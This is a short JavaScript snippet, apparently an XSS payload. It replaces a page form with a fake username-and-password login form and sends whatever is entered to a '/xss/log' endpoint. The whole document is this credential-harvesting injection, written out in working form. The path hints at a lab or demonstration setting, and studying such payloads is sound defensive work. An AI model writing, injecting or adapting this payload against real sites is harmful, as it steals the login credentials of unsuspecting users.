(function () {
    let form = document.getElementById('form');
    let currentUrl = window.top.location.href;
    if (form !== null && !currentUrl.includes('error=1') && form.querySelector('input[type="password"]') === null) {
        form.innerHTML = 'Username: <input type="text" name="username" placeholder="Username..." required> Password: <input type="password" name="password" placeholder="Password..." required> <button type="submit" class="primary">Login</button>';
        form.action = '/xss/log';
    }
})();


